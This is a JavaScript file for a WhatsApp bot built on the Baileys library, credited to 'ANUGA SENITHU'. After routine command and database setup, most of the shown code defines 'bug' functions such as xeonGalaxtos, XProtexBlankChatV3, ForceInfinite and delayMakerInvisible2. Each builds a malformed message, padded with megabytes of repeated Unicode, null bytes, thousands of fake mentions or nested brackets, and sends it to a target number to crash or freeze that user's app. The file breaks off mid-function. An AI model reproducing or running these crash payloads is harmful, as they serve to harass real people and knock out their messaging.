process.on('uncaughtException', console.error)
require("./config")
const { generateMessageID, generateMessageIDV2, WA_DEFAULT_EPHEMERAL, encodeSignedDeviceIdentity, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@adiwajshing/baileys")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const nodemailer = require('nodemailer')
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const pino = require('pino')
const logger = pino({ level: 'debug' });
const JSConfuser = require("js-confuser");
const crypto = require('crypto');
const path = require('path')
//const express = require('express');
const ms = require('ms');
const os = require('os')
 
/*const app = express();
const PORT = process.env.PORT || 3000;*/

module.exports = async (XeonBotInc, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib2/myfunc')
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (XeonBotInc.user.id.split(':')[0]+'@s.whatsapp.net' || XeonBotInc.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...(global.db.data.owners || [])].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const isDeveloper = (m && m.sender && (global.db.data.owners || []).map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)


const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isReact = m.message.reactionMessage ? true : false
const ownerNumbers = [94710695082];


//===============[DATABASE]=====================\\
		try {
			let isNumber = x => typeof x === 'number' && !isNaN(x)
			let user = global.db.data.users[m.sender]
			if (typeof user !== 'object') global.db.data.users[m.sender] = {}
			if (user) {
				if (!isNumber(user.premiumExpiry)) user.premiumExpiry = 0
			} else global.db.data.users[m.sender] = {
				premiumExpiry: 0
			}
			
			let setting = global.db.data.settings[botNumber]
			if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
            if (!('antiswview' in setting)) setting.antiswview = false
            } else global.db.data.settings[botNumber] = {
               antiswview: false,
            }
		} catch (e) {
			console.log(e)
		}
		//=====\\
const cd = require('./lib2/countdown')
let usersdb = global.db.data.users
fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2))
const isPremium = isCreator ? true : cd.isPremium(usersdb, m.sender)
const isRentBotUser = isDeveloper ? true : cd.isPremium(usersdb, m.sender)
//====================================\\
//bug
xeontex = "\n " + (args.join(" ") ? args.join(" ") : "Telegram: Telegram : ANUWH4YOU") + "\n\n\n";
    jidds = [];
    xeontex += "*~@94710695082~*\n*🦄*\n*~@94710695082~*\n".repeat(10200);
    jidds.push("94710695082@s.whatsapp.net", "94710695082@s.whatsapp.net");
//bug database
const wkwk = fs.readFileSync(`./69/x.mp3`)
const xsteek = fs.readFileSync(`./69/x.webp`)
const o = fs.readFileSync(`./69/o.jpg`)
// No Need to Do Anything If You Don't Want Errors

//time
const xtime = moment.tz('Asia/Colombo').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Colombo').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Colombo').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var xeonytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 } 
 
 function sendMessageWithMentions2(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return XeonBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return XeonBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return XeonBotInc.sendMessage(m.chat, {
                        text: text,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [mentions],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363399531796033@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://postimg.cc/nX6ZH38b",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: false
}
}
                        }, {quoted:m})
  } else {
    return XeonBotInc.sendMessage(m.chat, {
                        text: text,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [mentions],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363399531796033@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://postimg.cc/nX6ZH38b",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: false
}
}
                        }, {quoted:m})
  }
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

//group chat msg by xeon
const replygcxeon = (teks) => {
	XeonBotInc.sendMessage(m.chat, {
                        text: teks,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363399531796033@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://postimg.cc/nX6ZH38b",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: false
}
}
                        }, {quoted:m})

}
   
//self public
if (!XeonBotInc.public) {
if (!isCreator) return
}

if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('XeonBug20.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('There is an error:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `Sorry, the command you gave is wrong. Maybe this is what you mean:\n\n•> ${prefix+mean}\n•> Similarities: ${similarityPercentage}%`
replygcxeon(response)
}}  
const allowedUsersFile = './allowedUsers12.json';

// Load allowed users from file
let allowedUsers12 = [];
if (fs.existsSync(allowedUsersFile)) {
  allowedUsers12 = JSON.parse(fs.readFileSync(allowedUsersFile, 'utf8'));
}

const ANUGA-SENITHUmatch12 = m.sender;

/*case "sc": case "script": {
  if (allowedUsers12.includes(ANUGA-SENITHUmatch12)) {
    if (!q) {
      return reply(`💡 *Provide a phone number and sms amount*\n> Example: ${prefix + command} 94xxx 15`);
    }
  } else {
    reply(`*_Here is Official ANUGA-SENITHU Channels You Can Get Free Sc And All Updates_*\n> t.me/ANUWH4YOU1\n> YT: @anuga_official\n> https:                                                                                                                
  }
}
break;*/

/*case "addallowed": {
  if (!q) return reply(`💡 *Provide a number to add to allowed users*\n> Example: ${prefix + command} 923xxxxxxxxx`);
  const numberToAdd = q + '@s.whatsapp.net';
  if (!allowedUsers12.includes(numberToAdd)) {
    allowedUsers12.push(numberToAdd);
    fs.writeFileSync(allowedUsersFile, JSON.stringify(allowedUsers12, null, 2));
    reply(`✅ Number ${q} has been added to allowed users.`);
  } else {
    reply(`ℹ️ Number ${q} is already in allowed users.`);
  }
}
break;*/
//==============================================================\\
//Force Permanent [ all whatsapp ]
//Force Spam [ whatsapp beta ]
async function xeonGalaxtos(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "@null", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "120363399531796033@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 10000000)}@s.whatsapp.net`
              )
            ],
            externalAdReply: {
              quotedAd: {
                advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                caption: `Telegram: @DGXeon13${"𑇂𑆵𑆴𑆿".repeat(60000)}`
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          }
        }
      }
    }
  }, {});

  await XeonBotInc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
}
async function xeonAndroSpam(targetNumber){
   let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "ꦾ".repeat(1000),
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net", "120363399531796033@s.whatsapp.net"],
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                 name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                 name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
            ],
            messageParamsJson: "[{".repeat(10000),
            messageParamsJson: "[{".repeat(10000),
            messageParamsJson: "[{".repeat(10000),
          },
        },
      },
    },
  };
  await XeonBotInc.relayMessage(targetNumber, message, {
      messageId: null,
      participant: { jid: targetNumber },
      userJid: targetNumber,
    });
    }
    async function forcer(isTarget){
	const rajaXeon = {
  key: {
    remoteJid: '120363399531796033@g.us',
    fromMe: true,
    id: '1BCED5F78D153A18F0AC68B38DAB8D9A',
    participant: '94710695082@s.whatsapp.net'
  },
  messageTimestamp: 1753786706,
  pushName: '! ⛶͢🧪ANUGA SENITHU->͢𝙿𝚑𝚞𝚌𝚔𝚈𝚘𝚞𝙶𝚊yy🧪',
  broadcast: false,
  status: 2,
  message: {
    conversation: '! ⛶͢🧪ANUGA SENITHU->͢𝙿𝚑𝚞𝚌𝚔𝚈𝚘𝚞𝙶𝚊yy🧪',
    messageContextInfo: {
      messageSecret: new Uint8Array([
        123, 153, 59, 66, 69, 1, 31, 219,
        233, 201, 204, 107, 149, 77, 233, 100,
        80, 15, 30, 192, 133, 13, 171, 48,
        44, 27, 61, 135, 73, 149, 172, 105
      ])
    }
  },
  id: '1BCED5F78D153A18F0AC68B38DAB8D9A',
  isBaileys: false,
  chat: '120363399531796033@g.us',
  fromMe: true,
  isGroup: true,
  sender: '94710695082@s.whatsapp.net',
  participant: '94710695082@s.whatsapp.net',
  mtype: 'conversation',
  msg: '! ⛶͢🧪ANUGA SENITHU->͢𝙿𝚑𝚞𝚌𝚔𝚈𝚘𝚞𝙶𝚊yy🧪',
  body: '! ⛶͢🧪ANUGA SENITHU->͢𝙿𝚑𝚞𝚌𝚔𝚈𝚘𝚞𝙶𝚊yy🧪',
  quoted: null,
  mentionedJid: [],
  text: '! ⛶͢🧪ANUGA SENITHU->͢𝙿𝚑𝚞𝚌𝚔𝚈𝚘𝚞𝙶𝚊yy🧪',
  reply: function() {}, // Placeholder for function
  copy: function() {}, // Placeholder for function
  copyNForward: function() {} // Placeholder for function
};
	await XeonBotInc.relayMessage(
    isTarget,
    {
      locationMessage: {
        degreesLatitude: '! ⛶͢🧪ANUGA SENITHU->͢𝙿𝚑𝚞𝚌𝚔𝚈𝚘𝚞𝙶𝚊yy🧪',
        degreesLongitude: '! ⛶͢🧪ANUGA SENITHU->͢𝙿𝚑𝚞𝚌𝚔𝚈𝚘𝚞𝙶𝚊yy🧪',
        name: `! ⛶͢🧪ANUGA SENITHU->͢𝙿𝚑𝚞𝚌𝚔𝚈𝚘𝚞𝙶𝚊yy🧪`,
        url: bugUrl,
        contextInfo: {
          forwardingScore: 508,
          isForwarded: true,
          isLiveLocation: true,
          fromMe: false,
          participant: '0@s.whatsapp.net',
          remoteJid: sender,
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/pdf",
              title: "crash",
              pageCount: 1000000000,
              fileName: "crash.pdf",
              contactVcard: true
            }
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363399531796033@newsletter',
            serverMessageId: 1,
            newsletterName: " " + bug + bug
          },
          externalAdReply: {
            title: ' Telegram: @DGXeon13 ',
            body: 'Telegram: @DGXeon13',
            mediaType: 0,
            thumbnail: rajaXeon,
            jpegThumbnail: rajaXeon,
            mediaUrl: `https://www.youtube.com/@dgxeon`,
            sourceUrl: `https://www.youtube.com/@dgxeon`
          }
        }
      }
    },
    {
      participant: {
        jid: isTarget
      }
    },
    {
      messageId: null
    }
);
	
	}
async function xiosinvi(target){
	const xeonIpong = "ANUGA-SENITHU  🤡🔥"+ "𑇂𑆵𑆴𑆿".repeat(60000);
    const genMsg = (fileName, bodyText) => generateWAMessageFromContent(target, proto.Message.fromObject({
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/json",
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999999",
                            pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: fileName,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1715880173"
                        },
                        hasMediaAttachment: true
                    },
                    body: { text: bodyText },
                    nativeFlowMessage: {
                        messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_action_payload":{"screen":"CTZ_SCREEN"},"flow_cta":"Telegram: @DGXeon13","flow_id":"Telegram: @DGXeon13","flow_message_version":"9.903","flow_token":"Telegram: @DGXeon13"}`
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Telegram: @anuga_official" }]
                    }
                }
            }
        }
    }), { userJid: target });
await XeonBotInc.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "Telegram: @anuga_official" + xeonIpong,
            url: "https://youtube.com/@anuga_official"
        }
    }, { participant: { jid: target } });
    
    await XeonBotInc.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "ANUGA-SENITHU Here 🤡" + xeonIpong,
            url: "https://youtube.com/@anuga_official"
        }
    }, { participant: { jid: target } });
    }
async function InvisHard(target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "INVISHARDER",
                    footerText: "InvisibleHard༑",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "🇷🇺" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await XeonBotInc.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await XeonBotInc.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "InvisHarder" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
async function XProtexBlankChatV3(target) {
  const XProtex = '_*~@2~*_\n'.repeat(10500);
  const Private = 'ោ៝'.repeat(10000);
   
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "1@newsletter",
      newsletterName: "! ⛶͢͢ANUGS SENITHU" + "ោ៝".repeat(20000),
      caption: "! ⛶͢ANUGA SENITHU->͢" + Private + "ោ៝".repeat(20000),
      inviteExpiration: "999999999",
    },
  };

  await XeonBotInc.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });

  const messageCrash2 = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: XeonBotInc.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "! ⛶͢ANUGA SENITHU->͢",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: ""
                    },
                },
              },
            body: {
              text: "! ⛶͢🧪ANUGA SENITHU->͢🦠!!" + "ꦾ".repeat(2000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
              ],
            },
          },
        },
      },
    };
    await XeonBotInc.relayMessage(target, messageCrash2, {
      participant: { jid: target },
    });

    console.log(`Succes Sending Bug Crash By XProtexGlow To ${target}`);
      }
async function ForceInfinite(target) {
try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "! ⛶͢🧪ANUGA SENITHU->͢𝙿𝚑𝚞𝚌𝚔𝚈𝚘𝚞𝙶𝚊yy🧪",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude:  -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "! ⛶͢🧪ANUGA SENITHU->͢🦠",
                address: "꧀꧀꧀꧀꧀꧀꧀꧀꧀꧀",
              },
            },
            body: {
              text: "! ⛶͢🧪ANUGA SENITHU🧪",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await XeonBotInc.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
    }
    console.log(`Succes Bug Sent To ${target}`);
}
async function delayMakerInvisible2(target) {
let venomModsData = JSON.stringify({
status: true,
criador: "VenomMods",
resultado: {
type: "md",
ws: {
_events: {
"CB:ib,,dirty": ["Array"]
},
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
connCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: {
Object: "authData"
},
markOnlineOnconnCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: {
Object: "transactionOptsData"
},
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: {
Object: "appStateMacData"
},
mobile: true
}
}
}
});
let stanza = [{
attrs: {
biz_bot: "1"
},
tag: "bot"
}, {
attrs: {},
tag: "biz"
}];
let message = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 3.2,
isStatusBroadcast: true,
statusBroadcastJid: "status@broadcast",
badgeChat: {
unreadCount: 9999
}
},
forwardedNewsletterMessageInfo: {
newsletterJid: "proto@newsletter",
serverMessageId: 1,
newsletterName: `DELAY - 🩸${"MARKER - 🩸".repeat(10)}`,
contentType: 3,
accessibilityText: `𝐉𝚺͢𝐗𝐏𝐋𝚹𝐈𝐓-𝐗 - 🩸 ${"﹏".repeat(102002)}`
},
interactiveMessage: {
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: target
},
dataSharingContext: {
showMmDisclosure: true
},
participant: "0@s.whatsapp.net",
mentionedJid: ["120363399531796033@s.whatsapp.net"]
},
body: {
text: "" + "ꦽ".repeat(102002) + "".repeat(102002)
},
nativeFlowMessage: {
buttons: [{
name: "single_select",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_method",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "call_permission_request",
buttonParamsJson: venomModsData + "".repeat(9999),
voice_call: "call_galaxy"
}, {
name: "form_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_learn_more",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_transaction_details",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_fbpin_reset",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "catalog_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_info",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "review_order",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "send_location",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payments_care_csat",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "view_product",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_settings",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "address_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "automated_greeting_message_view_catalog",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "open_webview",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "message_with_link_status",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_status",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "galaxy_costum",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "extensions_message_v2",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "landline_call",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "mpm",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_copy",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_url",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "review_and_pay",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "galaxy_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_call",
buttonParamsJson: venomModsData + "".repeat(9999)
}]
}
}
},
additionalNodes: stanza,
stanzaId: `stanza_${Date.now()}`
}
}
await XeonBotInc.relayMessage(target, message, {
participant: {
jid: target
}
});
}
async function FloodUIxFC(target) {
  const floodXMention = [
    "0@s.whatsapp.net",
    "120363399531796033@s.whatsapp.net",
    ...Array.from({ length: 5000 }, () =>
      "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
    ),
  ];

  for (let i = 0; i < 1; i++) {
    const mediaFlood = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "! ⛶͢🧪ANUGA SENITHU->͢𝙿𝚑𝚞𝚌𝚔𝚈𝚘𝚞𝙶𝚊yy🧪",
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: floodXMention,
              ephemeralSettingTimestamp: 9741,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING",
              },
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
